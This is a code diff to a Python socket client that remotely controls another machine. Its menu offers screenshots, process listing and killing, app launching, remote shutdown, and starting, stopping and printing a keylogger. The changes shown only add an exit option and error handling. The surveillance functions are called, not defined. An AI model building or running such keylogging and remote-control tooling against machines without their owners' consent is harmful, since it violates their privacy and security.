@@ -23,7 +23,7 @@ FLAG_APPS_END = 'APPS_END'
 BUFFER_SIZE = 1024
 
 # SCREENSHOT
-TMP_PATH = './tmp/'
+TMP_PATH = os.path.join(os.getcwd(), 'tmp')
 
 
 class Client:
@@ -65,32 +65,40 @@ class Client:
       7: Start key logger
       8: Stop key logger
       9: Print key logger
-      10: Shutdown''')
+      10: Shutdown
+      0: Exit''')
       cmd = input('Enter command: ')
-      if cmd == '1':
-        self.take_screenshot()
-        self.receive_file(TMP_PATH, 'screenshot.png')
-      elif cmd == '2':
-        self.view_processes()
-      elif cmd == '3':
-        self.view_apps()
-      elif cmd == '4':
-        pid = input('Enter pid: ')
-        self.kill_process(pid)
-      elif cmd == '5':
-        app_name = input('Enter app name: ')
-        self.start_app(app_name)
-      elif cmd == '6':
-        pass
-      elif cmd == '7':
-        self.start_keylogger()
-      elif cmd == '8':
-        self.stop_keylogger()
-      elif cmd == '9':
-        self.print_keylogger()
-      elif cmd == '10':
-        self.shutdown()
-        break
+      try:
+        if cmd == '1':
+          self.take_screenshot()
+          self.receive_file(TMP_PATH, 'screenshot.png')
+        elif cmd == '2':
+          self.view_processes()
+        elif cmd == '3':
+          self.view_apps()
+        elif cmd == '4':
+          pid = input('Enter pid: ')
+          self.kill_process(pid)
+        elif cmd == '5':
+          app_name = input('Enter app name: ')
+          self.start_app(app_name)
+        elif cmd == '6':
+          pass
+        elif cmd == '7':
+          self.start_keylogger()
+        elif cmd == '8':
+          self.stop_keylogger()
+        elif cmd == '9':
+          self.print_keylogger()
+        elif cmd == '10':
+          self.shutdown()
+          break
+        elif cmd == '0':
+          print("[EXIT] Exiting...")
+          break
+      except ConnectionResetError:
+        print("[ERROR] Connection reset")
+        exit()
 
   def shutdown(self):
     self.socket.send(CMD_SHUTDOWN.encode())
